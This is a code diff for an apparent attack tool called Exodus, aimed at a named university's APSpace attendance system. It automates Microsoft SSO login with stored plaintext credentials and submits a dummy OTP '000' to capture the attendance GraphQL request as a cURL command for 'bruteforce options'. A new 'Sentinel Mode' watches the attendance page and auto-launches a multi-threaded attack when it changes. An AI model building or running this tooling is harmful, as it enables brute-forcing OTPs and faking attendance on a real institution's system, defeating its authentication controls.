@@ -22,7 +22,182 @@ import global_attack
 os.system("title Exodus.exe")
 
 APSPACE_ATTENDIX_URL = "https://apspace.apu.edu.my/attendix/update"
+APSPACE_ATTENDANCE_URL = "https://apspace.apu.edu.my/tabs/attendance"
 GRAPHQL_ENDPOINT = "https://attendix.apu.edu.my/graphql"
+
+# ================= Shared Browser Helpers ================= #
+
+def _ensure_playwright():
+    """Ensure Playwright is installed. Returns the module or None."""
+    try:
+        from playwright.sync_api import sync_playwright
+        return sync_playwright
+    except ImportError:
+        print(ui.font("\n [!] Playwright not installed.", color="red"))
+        print(ui.font(" Installing Playwright... (this may take a minute)", color="yellow"))
+
+        import subprocess
+        try:
+            subprocess.run(["pip", "install", "playwright"], check=True)
+            subprocess.run(["playwright", "install", "chromium"], check=True)
+            from playwright.sync_api import sync_playwright
+            print(ui.font(" [SUCCESS] Playwright installed!", color="green"))
+            return sync_playwright
+        except Exception as e:
+            print(ui.font(f"\n [ERROR] Could not install Playwright: {e}", color="red"))
+            print(ui.font(" Please run: pip install playwright && playwright install chromium", color="yellow"))
+            return None
+
+def _launch_browser(p, headless=False):
+    """Launch browser with Chrome→Edge→Chromium fallback. Returns (browser, name)."""
+    browser = None
+    browser_name = None
+
+    try:
+        browser = p.chromium.launch(headless=headless, channel="chrome")
+        browser_name = "Chrome"
+    except Exception:
+        pass
+
+    if browser is None:
+        try:
+            browser = p.chromium.launch(headless=headless, channel="msedge")
+            browser_name = "Edge"
+        except Exception:
+            pass
+
+    if browser is None:
+        if not headless:
+            print(ui.font(" [!] No Chrome/Edge found. Using bundled Chromium...", color="yellow"))
+        browser = p.chromium.launch(headless=headless)
+        browser_name = "Chromium"
+    else:
+        if not headless:
+            print(ui.font(f" [*] Using your installed {browser_name} browser", color="green"))
+
+    return browser, browser_name
+
+def _perform_login(page, login_data, headless=False):
+    """Automate Microsoft SSO login on APSpace. Returns True on success."""
+    email = login_data.get('email')
+    password = login_data.get('password')
+
+    if not headless:
+        print(ui.font("\n [*] Automating login sequence...", color="cyan"))
+
+    page.goto("https://apspace.apu.edu.my/login")
+
+    try:
+        page.wait_for_selector("text=Log In", timeout=10000)
+        page.locator("text=Log In").first.click()
+    except Exception as e:
+        if not headless:
+            print(ui.font(f"\n [ERROR] Could not find the Log In button: {e}", color="red"))
+        return False
+
+    try:
+        page.wait_for_selector("input[type='email']", timeout=15000)
+        page.fill("input[type='email']", email)
+        page.locator("input[type='submit']").first.click()
+
+        page.wait_for_selector("input[type='password']", timeout=15000)
+        page.fill("input[type='password']", password)
+        page.wait_for_timeout(1000)
+        page.locator("input[type='submit']").first.click()
+
+        try:
+            page.wait_for_selector("input[id='idBtn_Back']", timeout=5000)
+            page.locator("input[id='idBtn_Back']").first.click()
+        except:
+            pass
+
+        if not headless:
+            print(ui.font(" [*] Login successful.", color="green"))
+        return True
+
+    except Exception as e:
+        if not headless:
+            print(ui.font(f"\n [ERROR] Automated login failed: {e}", color="red"))
+        return False
+
+def _build_curl_from_request(request):
+    """Convert Playwright request to cURL bash format."""
+    url = request.url
+    headers = request.headers
+    post_data = request.post_data
+
+    curl_parts = [f"curl '{url}'"]
+
+    for key, value in headers.items():
+        if key.lower() in ['content-length', 'host']:
+            continue
+        curl_parts.append(f"  -H '{key}: {value}'")
+
+    if post_data:
+        curl_parts.append(f"  --data-raw '{post_data}'")
+
+    return " \\\n".join(curl_parts)
+
+def _capture_curl(page, save_path, headless=False):
+    """Navigate to attendix, inject OTP 000, capture cURL request. Returns cURL string or None."""
+    captured_curl = [None]
+
+    def handle_request(request):
+        if GRAPHQL_ENDPOINT in request.url and request.method == "POST":
+            post_data = request.post_data
+            if post_data and "updateAttendance" in post_data:
+                captured_curl[0] = _build_curl_from_request(request)
+                if not headless:
+                    print(ui.font("\n [SUCCESS] cURL request captured!", color="green", inverse=True))
+
+    page.on("request", handle_request)
+
+    page.goto(APSPACE_ATTENDIX_URL)
+
+    try:
+        if not headless:
+            print(ui.font(" [*] Injecting OTP '000' and capturing request...", color="cyan"))
+
+        page.wait_for_selector("input", timeout=15000)
+        page.wait_for_timeout(2000)
+
+        inputs = page.locator("input").element_handles()
+        if len(inputs) >= 3:
+            for i in range(3):
+                inputs[i].fill("0")
+            inputs[2].press("Enter")
+
+    except Exception as e:
+        if not headless:
+            print(ui.font(f"\n [ERROR] OTP injection failed: {e}", color="red"))
+        return None
+
+    timeout_counter = 0
+    while captured_curl[0] is None:
+        try:
+            page.wait_for_timeout(500)
+            timeout_counter += 1
+            if headless and timeout_counter > 120:
+                break
+        except:
+            break
+
+    # Remove listener to avoid duplicate captures
+    page.remove_listener("request", handle_request)
+
+    if captured_curl[0]:
+        try:
+            with open(save_path, 'w', encoding='utf-8') as f:
+                f.write(captured_curl[0])
+            if not headless:
+                print(ui.font(f"\n [SUCCESS] cURL saved to: {save_path}", color="green", inverse=True))
+        except Exception as e:
+            if not headless:
+                print(ui.font(f"\n [ERROR] Failed to save: {e}", color="red"))
+
+    return captured_curl[0]
+
+# ================= Auto-Grab cURL ================= #
 
 def auto_grab_curl(save_dest=None, login_data=None, headless=False):
     """
@@ -32,26 +207,13 @@ def auto_grab_curl(save_dest=None, login_data=None, headless=False):
     if not headless:
         ui.clear()
         print(ui.font(" Auto-Grab cURL (Automated) ", color="cyan", inverse=True))
-    
-    # Check if playwright is available
-    try:
-        from playwright.sync_api import sync_playwright
-    except ImportError:
-        print(ui.font("\n [!] Playwright not installed.", color="red"))
-        print(ui.font(" Installing Playwright... (this may take a minute)", color="yellow"))
-        
-        import subprocess
-        try:
-            subprocess.run(["pip", "install", "playwright"], check=True)
-            subprocess.run(["playwright", "install", "chromium"], check=True)
-            from playwright.sync_api import sync_playwright
-            print(ui.font(" [SUCCESS] Playwright installed!", color="green"))
-        except Exception as e:
-            print(ui.font(f"\n [ERROR] Could not install Playwright: {e}", color="red"))
-            print(ui.font(" Please run: pip install playwright && playwright install chromium", color="yellow"))
+
+    sync_playwright = _ensure_playwright()
+    if not sync_playwright:
+        if not headless:
             input("\n Press Enter to return to menu...")
-            return
-    
+        return
+
     if not headless:
         print(ui.font("\n HOW THIS WORKS:", color="yellow", bold=True))
         print("""
@@ -64,7 +226,7 @@ def auto_grab_curl(save_dest=None, login_data=None, headless=False):
  NOTE: The request will fail (wrong OTP) but that's expected.
        We just need to capture the request format.
 """)
-    
+
     if save_dest is None:
         input_dir = os.path.join(os.getcwd(), 'Input')
         if not os.path.exists(input_dir):
@@ -72,215 +234,327 @@ def auto_grab_curl(save_dest=None, login_data=None, headless=False):
         save_path = os.path.join(input_dir, 'temp.txt')
     else:
         save_path = save_dest
-    
+
     if not headless:
         print(ui.font("\n [*] Opening browser... Please log in and submit an OTP.", color="cyan"))
         print(ui.font(" [*] The browser will close automatically once captured.", color="cyan"))
-    
-    captured_curl = [None]  # Use list to allow modification in closure
-    
-    def build_curl_from_request(request):
-        """Convert Playwright request to cURL bash format"""
-        url = request.url
-        method = request.method
-        headers = request.headers
-        post_data = request.post_data
-        
-        curl_parts = [f"curl '{url}'"]
-        
-        for key, value in headers.items():
-            # Skip some headers that are auto-generated
-            if key.lower() in ['content-length', 'host']:
-                continue
-            curl_parts.append(f"  -H '{key}: {value}'")
-        
-        if post_data:
-            curl_parts.append(f"  --data-raw '{post_data}'")
-        
-        return " \\\n".join(curl_parts)
-    
+
     try:
         with sync_playwright() as p:
-            # Try to use user's installed browser (Chrome first, then Edge)
-            browser = None
-            browser_name = None
-            
-            
-            # Use headless mode based on param
-            headless_mode = headless
-            
-            # Try Chrome first (most common)
-            try:
-                browser = p.chromium.launch(headless=headless_mode, channel="chrome")
-                browser_name = "Chrome"
-            except Exception:
-                pass
-            
-            # Fallback to Edge (comes pre-installed on Windows)
-            if browser is None:
-                try:
-                    browser = p.chromium.launch(headless=headless_mode, channel="msedge")
-                    browser_name = "Edge"
-                except Exception:
-                    pass
-            
-            # Last resort: use bundled Chromium
-            if browser is None:
-                if not headless:
-                    print(ui.font(" [!] No Chrome/Edge found. Using bundled Chromium...", color="yellow"))
-                browser = p.chromium.launch(headless=headless_mode)
-                browser_name = "Chromium"
-            else:
-                if not headless:
-                    print(ui.font(f" [*] Using your installed {browser_name} browser", color="green"))
-            
+            browser, browser_name = _launch_browser(p, headless=headless)
             context = browser.new_context()
             page = context.new_page()
-            
-            # Intercept requests to graphql endpoint
-            def handle_request(request):
-                if GRAPHQL_ENDPOINT in request.url and request.method == "POST":
-                    # Check if it's the updateAttendance mutation
-                    post_data = request.post_data
-                    if post_data and "updateAttendance" in post_data:
-                        captured_curl[0] = build_curl_from_request(request)
-                        if not headless:
-                            print(ui.font("\n [SUCCESS] cURL request captured!", color="green", inverse=True))
-            
-            page.on("request", handle_request)
-            
+
             if login_data:
-                email = login_data.get('email')
-                password = login_data.get('password')
-                
-                if not headless:
-                    print(ui.font("\n [*] Automating login sequence...", color="cyan"))
-                
-                # Navigate to APSpace Login
-                page.goto("https://apspace.apu.edu.my/login")
-                
-                # Click the "Log In" button on the APSpace landing page
-                try:
-                    page.wait_for_selector("text=Log In", timeout=10000)
-                    page.locator("text=Log In").first.click()
-                except Exception as e:
-                    if not headless:
-                        print(ui.font(f"\n [ERROR] Could not find the Log In button: {e}", color="red"))
-                    captured_curl[0] = "ERROR"
-                    browser.close()
-                    return
-                
-                # Wait for Microsoft login page
-                try:
-                    # Enter Email
-                    page.wait_for_selector("input[type='email']", timeout=15000)
-                    page.fill("input[type='email']", email)
-                    page.locator("input[type='submit']").first.click()
-                    
-                    # Enter Password
-                    page.wait_for_selector("input[type='password']", timeout=15000)
-                    page.fill("input[type='password']", password)
-                    page.wait_for_timeout(1000)  # brief pause
-                    page.locator("input[type='submit']").first.click()
-                    
-                    # Handle "Stay signed in?" prompt if it appears
-                    try:
-                        page.wait_for_selector("input[id='idBtn_Back']", timeout=5000) # "No" button
-                        page.locator("input[id='idBtn_Back']").first.click()
-                    except:
-                        pass # Ignore if it doesn't appear
-                        
-                    if not headless:
-                        print(ui.font(" [*] Login successful. Navigating to Attendix...", color="green"))
-                        
-                except Exception as e:
-                    if not headless:
-                        print(ui.font(f"\n [ERROR] Automated login failed: {e}", color="red"))
-                    captured_curl[0] = "ERROR"
+                if not _perform_login(page, login_data, headless=headless):
                     browser.close()
                     return
 
-                # Navigate to Attendix Update
-                page.goto(APSPACE_ATTENDIX_URL)
-                
-                # Inject a dummy OTP (000)
-                try:
-                    if not headless:
-                        print(ui.font(" [*] Injecting OTP '000' and capturing request...", color="cyan"))
-                        
-                    # Wait for the OTP input fields to appear
-                    page.wait_for_selector("input", timeout=15000)
-                    page.wait_for_timeout(2000) # Give page time to fully initialize inputs
-                    
-                    # There are 3 inputs for the OTP. We fill them all with '0' and press Enter.
-                    inputs = page.locator("input").element_handles()
-                    if len(inputs) >= 3:
-                        for i in range(3):
-                            inputs[i].fill("0")
-                            
-                        # Press enter instantly on the last input to trigger verification
-                        inputs[2].press("Enter")
-                        
-                except Exception as e:
-                    if not headless:
-                        print(ui.font(f"\n [ERROR] OTP injection failed: {e}", color="red"))
-                    captured_curl[0] = "ERROR"
-                    browser.close()
-                    return
-                    
+                if not headless:
+                    print(ui.font(" [*] Navigating to Attendix...", color="green"))
+
+                result = _capture_curl(page, save_path, headless=headless)
+
+                if not result and not headless:
+                    print(ui.font("\n [!] No request was captured.", color="yellow"))
+                    print(ui.font(" Make sure the Attendix page loaded correctly.", color="white"))
             else:
                 # Manual Flow
-                # Navigate to APSpace
+                captured_curl = [None]
+
+                def handle_request(request):
+                    if GRAPHQL_ENDPOINT in request.url and request.method == "POST":
+                        post_data = request.post_data
+                        if post_data and "updateAttendance" in post_data:
+                            captured_curl[0] = _build_curl_from_request(request)
+                            print(ui.font("\n [SUCCESS] cURL request captured!", color="green", inverse=True))
+
+                page.on("request", handle_request)
                 page.goto(APSPACE_ATTENDIX_URL)
-                
+
                 print(ui.font("\n [*] Waiting for you to log in and submit an OTP...", color="yellow"))
                 print(ui.font(" [*] (Browser will auto-close after capture)", color="yellow"))
-            
-            # Wait until we capture the request or user closes browser
-            timeout_counter = 0
-            while captured_curl[0] is None:
-                try:
-                    page.wait_for_timeout(500)  # Check every 500ms
-                    timeout_counter += 1
-                    # 60 second timeout for automated headless to prevent hanging
-                    if headless and timeout_counter > 120:
-                        captured_curl[0] = "ERROR"
+
+                timeout_counter = 0
+                while captured_curl[0] is None:
+                    try:
+                        page.wait_for_timeout(500)
+                        timeout_counter += 1
+                    except:
                         break
-                except:
-                    break  # Browser was closed
-            
-            if captured_curl[0] == "ERROR":
-                captured_curl[0] = None # Reset so it doesn't save "ERROR"
-                
+
+                if captured_curl[0]:
+                    try:
+                        with open(save_path, 'w', encoding='utf-8') as f:
+                            f.write(captured_curl[0])
+                        print(ui.font(f"\n [SUCCESS] cURL saved to: {save_path}", color="green", inverse=True))
+                        print(ui.font(" You can now use the bruteforce options!", color="cyan"))
+                    except Exception as e:
+                        print(ui.font(f"\n [ERROR] Failed to save: {e}", color="red"))
+                        print(ui.font("\n Captured cURL (copy manually if needed):", color="yellow"))
+                        print(captured_curl[0])
+                else:
+                    print(ui.font("\n [!] No request was captured.", color="yellow"))
+                    print(ui.font(" Make sure you submitted an OTP on the Attendix page.", color="white"))
+
             browser.close()
-            
+
     except Exception as e:
         print(ui.font(f"\n [ERROR] Browser automation failed: {e}", color="red"))
-        input("\n Press Enter to return to menu...")
-        return
-    
-    # Save the captured cURL
-    if captured_curl[0]:
-        try:
-            with open(save_path, 'w', encoding='utf-8') as f:
-                f.write(captured_curl[0])
-            
-            
-            if not headless:
-                print(ui.font(f"\n [SUCCESS] cURL saved to: {save_path}", color="green", inverse=True))
-                print(ui.font(" You can now use the bruteforce options!", color="cyan"))
-        except Exception as e:
-            if not headless:
-                print(ui.font(f"\n [ERROR] Failed to save: {e}", color="red"))
-                print(ui.font("\n Captured cURL (copy manually if needed):", color="yellow"))
-                print(captured_curl[0])
-    else:
         if not headless:
-            print(ui.font("\n [!] No request was captured.", color="yellow"))
-            print(ui.font(" Make sure you submitted an OTP on the Attendix page.", color="white"))
-    
+            input("\n Press Enter to return to menu...")
+        return
+
     if not headless:
         input("\n Press Enter to return to menu...")
+
+# ================= Sentinel Mode ================= #
+
+def sentinel_mode():
+    """Monitor attendance page for changes and optionally auto-attack."""
+    import json
+    import keyboard
+
+    ui.clear()
+    print(ui.font("         - Sentinel Mode (Experimental) -         \n", color="green", inverse=True))
+    print(ui.font(" Made by Infinite | github.com/Infinite-Unknown", color="white", dim=True))
+    print(ui.font(" Updates: github.com/Infinite-Unknown/Exodus-POST_request_brute\n", color="white", dim=True))
+
+    print(ui.font(" HOW THIS WORKS:", color="yellow", bold=True))
+    print("""
+ 1. Logs into APSpace and opens the Attendance page.
+ 2. Refreshes the page every interval to check for changes.
+ 3. If attendance data changes (new class, percentage change, etc.),
+    it alerts you and optionally starts the attack automatically.
+
+ Press 'q' or 'esc' at any time to stop monitoring.
+""")
+
+    # --- Phase 1: Configuration ---
+
+    # Pick login credentials
+    logins_dir = os.path.join(os.getcwd(), 'Input', 'SavedLogins')
+    login_data = None
+
+    if os.path.exists(logins_dir):
+        login_files = [f for f in os.listdir(logins_dir) if f.endswith('.json')]
+    else:
+        login_files = []
+
+    if login_files:
+        print(ui.font(" Saved Accounts:", color="cyan"))
+        for i, lf in enumerate(login_files):
+            print(f"  {i+1}. {os.path.splitext(lf)[0]}")
+        print(f"  {len(login_files)+1}. Enter new credentials")
+
+        try:
+            pick = input(f"\n Select account (1-{len(login_files)+1}): ").strip()
+            pick_idx = int(pick) - 1
+
+            if 0 <= pick_idx < len(login_files):
+                login_path = os.path.join(logins_dir, login_files[pick_idx])
+                with open(login_path, 'r', encoding='utf-8') as f:
+                    login_data = json.load(f)
+                print(ui.font(f" Using: {os.path.splitext(login_files[pick_idx])[0]}", color="green"))
+            else:
+                login_data = None  # Will prompt below
+        except (ValueError, IndexError):
+            login_data = None
+
+    if not login_data:
+        email = input("\n Enter APU Email: ").strip()
+        password = input(" Enter Password: ").strip()
+        if not email or not password:
+            print(ui.font(" [!] Email and password required.", color="red"))
+            input("\n Press Enter to return to menu...")
+            return
+        login_data = {'email': email, 'password': password}
+
+    # Monitor interval
+    try:
+        interval_input = input("\n Monitor interval in seconds (default 60): ").strip()
+        monitor_interval = int(interval_input) if interval_input else 60
+        if monitor_interval < 10:
+            print(ui.font(" [!] Minimum 10 seconds. Using 10.", color="yellow"))
+            monitor_interval = 10
+    except ValueError:
+        monitor_interval = 60
+
+    # Auto-attack option
+    auto_attack = input(" Auto-start attack on change? (y/n, default n): ").strip().lower() == 'y'
+
+    num_threads = 4
+    cooldown = 0.0
+    if auto_attack:
+        try:
+            t_input = input(" Number of threads for attack (default 4): ").strip()
+            num_threads = int(t_input) if t_input else 4
+            if num_threads < 1 or num_threads > 100:
+                num_threads = 4
+        except ValueError:
+            num_threads = 4
+
+        try:
+            c_input = input(" Per-thread cooldown in seconds (default 0): ").strip()
+            cooldown = float(c_input) if c_input else 0.0
+        except ValueError:
+            cooldown = 0.0
+
+    # --- Phase 2: Browser launch & login ---
+
+    sync_playwright = _ensure_playwright()
+    if not sync_playwright:
+        input("\n Press Enter to return to menu...")
+        return
+
+    print(ui.font("\n [*] Launching browser and logging in...", color="cyan"))
+
+    try:
+        with sync_playwright() as p:
+            browser, browser_name = _launch_browser(p, headless=False)
+            context = browser.new_context()
+            page = context.new_page()
+
+            if not _perform_login(page, login_data):
+                print(ui.font(" [!] Login failed. Cannot start sentinel.", color="red"))
+                browser.close()
+                input("\n Press Enter to return to menu...")
+                return
+
+            # --- Phase 3: Navigate to attendance page & initial snapshot ---
+
+            print(ui.font(" [*] Navigating to Attendance page...", color="cyan"))
+            page.goto(APSPACE_ATTENDANCE_URL)
+            page.wait_for_load_state("networkidle")
+            page.wait_for_timeout(3000)  # Angular render time
+
+            previous_snapshot = page.inner_text("body")
+
+            ui.clear()
+            print(ui.font("         - Sentinel Mode (Active) -         \n", color="green", inverse=True))
+            print(ui.font(f" Monitoring every {monitor_interval}s | Auto-attack: {'ON' if auto_attack else 'OFF'}", color="cyan"))
+            if auto_attack:
+                print(ui.font(f" Attack config: {num_threads} threads, {cooldown}s cooldown", color="cyan"))
+            print(ui.font(" Press 'q' or 'esc' to stop.\n", color="yellow"))
+            print(ui.font(f" [{time.strftime('%H:%M:%S')}] Initial snapshot captured. Watching for changes...\n", color="green"))
+
+            # --- Phase 4: Monitor loop ---
+
+            cycle = 0
+            change_detected = False
+
+            while True:
+                # Check for user cancellation
+                if keyboard.is_pressed('q') or keyboard.is_pressed('esc'):
+                    print(ui.font("\n [Sentinel] Stopped by user.", color="yellow"))
+                    break
+
+                # Wait for interval (check cancellation every 0.5s)
+                slept = 0
+                cancelled = False
+                while slept < monitor_interval:
+                    if keyboard.is_pressed('q') or keyboard.is_pressed('esc'):
+                        cancelled = True
+                        break
+                    time.sleep(0.5)
+                    slept += 0.5
+
+                if cancelled:
+                    print(ui.font("\n [Sentinel] Stopped by user.", color="yellow"))
+                    break
+
+                cycle += 1
+
+                # Refresh the page
+                try:
+                    page.reload(wait_until="networkidle")
+                    page.wait_for_timeout(3000)
+                except Exception:
+                    # Check if session expired (redirected to login)
+                    try:
+                        current_url = page.url
+                        if "login" in current_url.lower() or "microsoftonline" in current_url.lower():
+                            print(ui.font(f" [{time.strftime('%H:%M:%S')}] Session expired. Re-authenticating...", color="yellow"))
+                            if _perform_login(page, login_data):
+                                page.goto(APSPACE_ATTENDANCE_URL)
+                                page.wait_for_load_state("networkidle")
+                                page.wait_for_timeout(3000)
+                            else:
+                                print(ui.font(" [!] Re-login failed. Stopping sentinel.", color="red"))
+                                break
+                        else:
+                            print(ui.font(f" [{time.strftime('%H:%M:%S')}] Cycle {cycle}: Page reload failed. Retrying...", color="red"))
+                    except:
+                        print(ui.font(f" [{time.strftime('%H:%M:%S')}] Cycle {cycle}: Browser error. Retrying...", color="red"))
+                    continue
+
+                # Check if we got redirected to login
+                try:
+                    current_url = page.url
+                    if "login" in current_url.lower() or "microsoftonline" in current_url.lower():
+                        print(ui.font(f" [{time.strftime('%H:%M:%S')}] Session expired. Re-authenticating...", color="yellow"))
+                        if _perform_login(page, login_data):
+                            page.goto(APSPACE_ATTENDANCE_URL)
+                            page.wait_for_load_state("networkidle")
+                            page.wait_for_timeout(3000)
+                        else:
+                            print(ui.font(" [!] Re-login failed. Stopping sentinel.", color="red"))
+                            break
+                except:
+                    pass
+
+                # Scrape current snapshot
+                try:
+                    current_snapshot = page.inner_text("body")
+                except Exception:
+                    print(ui.font(f" [{time.strftime('%H:%M:%S')}] Cycle {cycle}: Failed to scrape. Retrying...", color="red"))
+                    continue
+
+                # Compare
+                if current_snapshot != previous_snapshot:
+                    print("\a")  # System beep
+                    print(ui.font(f"\n {'='*50}", color="green"))
+                    print(ui.font(f" [{time.strftime('%H:%M:%S')}] CHANGE DETECTED! (Cycle {cycle})", color="green", inverse=True))
+                    print(ui.font(f" {'='*50}\n", color="green"))
+
+                    if auto_attack:
+                        change_detected = True
+                        break
+                    else:
+                        print(ui.font(" Auto-attack is OFF. Continuing monitoring...", color="cyan"))
+                        previous_snapshot = current_snapshot
+                else:
+                    print(f" [{time.strftime('%H:%M:%S')}] Cycle {cycle}: No change.")
+                    previous_snapshot = current_snapshot
+
+            # --- Phase 5: Auto-attack if change detected ---
+
+            if change_detected and auto_attack:
+                print(ui.font(" [Sentinel] Capturing session for attack...", color="cyan"))
+
+                save_path = os.path.join(os.getcwd(), 'Input', 'temp.txt')
+                curl_result = _capture_curl(page, save_path, headless=False)
+
+                browser.close()
+
+                if curl_result:
+                    print(ui.font("\n [Sentinel] Session captured! Starting attack...\n", color="green", inverse=True))
+
+                    attacker.load_config()
+                    attacker.run_attack_core(
+                        attacker.URL, attacker.HEADERS,
+                        num_threads, cooldown,
+                        account_name="Sentinel Auto-Attack"
+                    )
+                else:
+                    print(ui.font(" [!] Failed to capture session. Attack cancelled.", color="red"))
+            else:
+                browser.close()
+
+    except Exception as e:
+        print(ui.font(f"\n [ERROR] Sentinel mode failed: {e}", color="red"))
+
+    input("\n Press Enter to return to menu...")
 
 def single_account_menu():
     """Single Account submenu - attack and setup for single user"""
